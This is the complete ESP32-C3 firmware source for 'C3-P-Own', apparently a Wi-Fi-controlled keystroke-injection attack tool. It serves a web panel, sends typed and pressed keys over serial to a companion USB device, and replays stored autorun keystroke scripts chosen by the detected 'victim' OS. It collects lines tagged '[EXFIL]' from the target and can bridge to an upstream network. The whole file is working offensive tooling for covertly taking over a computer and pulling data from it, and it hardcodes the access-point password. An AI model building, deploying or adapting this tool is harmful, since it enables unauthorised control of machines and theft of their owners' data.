#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>
#include "lwip/lwip_napt.h"
#include "esp_netif.h"
#include "lwip/dns.h"
#include "lwip/inet.h"

void handleRoot();
void handleExecute();
void handleStatus();
void handleSetUpstream();
void handleGetAutorun();
void handleSetAutorun();
void handleClearAutorun();

const char* ap_ssid = "C3-P-Own";
const char* ap_pass = "pl$Ch@ng3Me";

WebServer server(80);

#define RX_PIN 6
#define TX_PIN 7

String victimOS     = "Detecting...";
String osConfidence = "0";
String exfilLog     = "Awaiting execution...\n";

String upstreamSSID = "";
String upstreamPass = "";
bool   natActive    = false;

// ── Autorun execution state machine ──────────────────────────────────────────
#define MAX_AR_STEPS 64
struct AutoStep { char type; String val; uint32_t ms; };
AutoStep arSteps[MAX_AR_STEPS];
int      arCount  = 0;
int      arIndex  = -1;    // -1 = idle
uint32_t arNextMs = 0;

static String arExtractField(const String& obj, const String& key) {
    String search = "\"" + key + "\":";
    int pos = obj.indexOf(search);
    if (pos < 0) return "";
    pos += search.length();
    if (pos >= (int)obj.length()) return "";
    if (obj[pos] == '"') {
        int end = obj.indexOf('"', pos + 1);
        return (end > pos) ? obj.substring(pos + 1, end) : "";
    }
    int end = pos;
    while (end < (int)obj.length() && obj[end] != ',' && obj[end] != '}') end++;
    return obj.substring(pos, end);
}

void parseAndLoadAutorun(const String& json) {
    arCount = 0; arIndex = -1;
    int i = 0;
    while (i < (int)json.length() && arCount < MAX_AR_STEPS) {
        int s = json.indexOf('{', i); if (s < 0) break;
        int e = json.indexOf('}', s); if (e < 0) break;
        String obj = json.substring(s + 1, e);
        String t   = arExtractField(obj, "t");
        if      (t == "TYPE")  { arSteps[arCount] = {'T', arExtractField(obj,"v"), 0}; arCount++; }
        else if (t == "PRESS") { arSteps[arCount] = {'P', arExtractField(obj,"k"), 0}; arCount++; }
        else if (t == "WAIT")  { arSteps[arCount] = {'W', "", (uint32_t)arExtractField(obj,"ms").toInt()}; arCount++; }
        i = e + 1;
    }
}

void loadAndStartAutorun(const String& os) {
    String path = "/ar_" + os + ".json";
    if (!LittleFS.exists(path)) { Serial.println("[AR] No autorun for " + os); return; }
    File f = LittleFS.open(path, "r");
    String json = f.readString(); f.close();
    parseAndLoadAutorun(json);
    if (arCount > 0) {
        arIndex  = 0;
        arNextMs = millis() + 1500; // 1.5s grace before first keystroke
        Serial.println("[AR] Queued " + String(arCount) + " steps for " + os);
    }
}

// Push 8.8.8.8 as DNS to AP DHCP leases so clients can resolve names via NAT
void setAPClientDNS() {
    uint32_t dns = inet_addr("8.8.8.8");
    esp_netif_t* ap_if = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_if) return;
    esp_netif_dhcps_stop(ap_if);
    esp_netif_dhcps_option(ap_if, ESP_NETIF_OP_SET,
                           ESP_NETIF_DOMAIN_NAME_SERVER,
                           &dns, sizeof(dns));
    esp_netif_dhcps_start(ap_if);
}

void connectUpstream() {
    if (upstreamSSID.length() == 0) return;
    Serial.println("[NET] Connecting to upstream: " + upstreamSSID);
    WiFi.begin(upstreamSSID.c_str(), upstreamPass.c_str());
    uint32_t t = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - t < 12000) delay(200);
    if (WiFi.status() == WL_CONNECTED) {
        natActive = true;
        ip_napt_enable(WiFi.softAPIP(), 1);
        setAPClientDNS();
        Serial.println("[NET] NAT active. IP: " + WiFi.localIP().toString());
    } else {
        natActive = false;
        WiFi.disconnect();
        Serial.println("[NET] Upstream failed.");
    }
}

void handleRoot() {
    if (LittleFS.exists("/index.html")) {
        File f = LittleFS.open("/index.html", "r");
        server.streamFile(f, "text/html");
        f.close();
    } else {
        server.send(404, "text/plain", "index.html missing");
    }
}

void handleExecute() {
    if (server.hasArg("val")) {
        Serial1.println(server.arg("val"));
        server.send(200, "text/plain", "OK");
    }
}

void handleStatus() {
    String json = "{\"os\":\"" + victimOS
                + "\",\"confidence\":\"" + osConfidence
                + "\",\"logs\":\"" + exfilLog
                + "\",\"nat\":\"" + (natActive ? "1" : "0")
                + "\",\"upstreamIP\":\"" + (natActive ? WiFi.localIP().toString() : "")
                + "\"}";
    server.send(200, "application/json", json);
}

void handleGetAutorun() {
    if (!server.hasArg("os")) { server.send(400, "text/plain", "missing os"); return; }
    String path = "/ar_" + server.arg("os") + ".json";
    if (!LittleFS.exists(path)) { server.send(200, "application/json", "[]"); return; }
    File f = LittleFS.open(path, "r");
    server.streamFile(f, "application/json");
    f.close();
}

void handleSetAutorun() {
    if (!server.hasArg("os"))    { server.send(400, "text/plain", "missing os");   return; }
    if (!server.hasArg("plain")) { server.send(400, "text/plain", "missing body"); return; }
    String os = server.arg("os");
    if (os != "WIN" && os != "MAC") { server.send(400, "text/plain", "invalid os"); return; }
    File f = LittleFS.open("/ar_" + os + ".json", "w");
    f.print(server.arg("plain"));
    f.close();
    server.send(200, "text/plain", "OK");
}

void handleClearAutorun() {
    if (!server.hasArg("os")) { server.send(400, "text/plain", "missing os"); return; }
    String path = "/ar_" + server.arg("os") + ".json";
    if (LittleFS.exists(path)) LittleFS.remove(path);
    server.send(200, "text/plain", "OK");
}

void handleSetUpstream() {
    if (!server.hasArg("ssid")) { server.send(400, "text/plain", "missing ssid"); return; }
    upstreamSSID = server.arg("ssid");
    upstreamPass = server.hasArg("pass") ? server.arg("pass") : "";
    connectUpstream();
    server.send(200, "text/plain", natActive ? "OK" : "FAIL");
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\nBooting C3-P-Own...");

    Serial1.begin(115200, SERIAL_8N1, RX_PIN, TX_PIN);

    if (!LittleFS.begin(true)) Serial.println("[FS] Mount failed");
    else                       Serial.println("[FS] Mounted");

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(ap_ssid, ap_pass);
    Serial.println("[NET] AP: " + String(ap_ssid) + "  IP: " + WiFi.softAPIP().toString());

    server.on("/",            handleRoot);
    server.on("/execute",     handleExecute);
    server.on("/status",      handleStatus);
    server.on("/setUpstream", handleSetUpstream);
    server.on("/getAutorun",   handleGetAutorun);
    server.on("/setAutorun",   HTTP_POST, handleSetAutorun);
    server.on("/clearAutorun", handleClearAutorun);
    server.begin();
    Serial.println("[NET] HTTP server up.");
}

void loop() {
    server.handleClient();

    // Autorun step dispatch (non-blocking state machine)
    if (arIndex >= 0 && arIndex < arCount && millis() >= arNextMs) {
        AutoStep& s = arSteps[arIndex];
        if      (s.type == 'T') { Serial1.println("TYPE "  + s.val); arNextMs = millis() + 60; }
        else if (s.type == 'P') { Serial1.println("PRESS " + s.val); arNextMs = millis() + 60; }
        else if (s.type == 'W') { arNextMs = millis() + s.ms; }
        arIndex++;
        if (arIndex >= arCount) { arIndex = -1; Serial.println("[AR] Done."); }
    }

    if (Serial1.available()) {
        String incoming = Serial1.readStringUntil('\n');
        Serial.print("[UART] "); Serial.println(incoming);

        if (incoming.startsWith("[DETECTED_OS]:")) {
            victimOS = incoming.substring(14); victimOS.trim();
        } else if (incoming.startsWith("[OS_CONFIDENCE]:")) {
            osConfidence = incoming.substring(16); osConfidence.trim();
        } else if (incoming.startsWith("[EXFIL]:")) {
            exfilLog += incoming.substring(8) + "\n";
        } else if (incoming.startsWith("[REQUEST_AUTORUN]:")) {
            String os = incoming.substring(18); os.trim();
            loadAndStartAutorun(os);
        }
    }
}
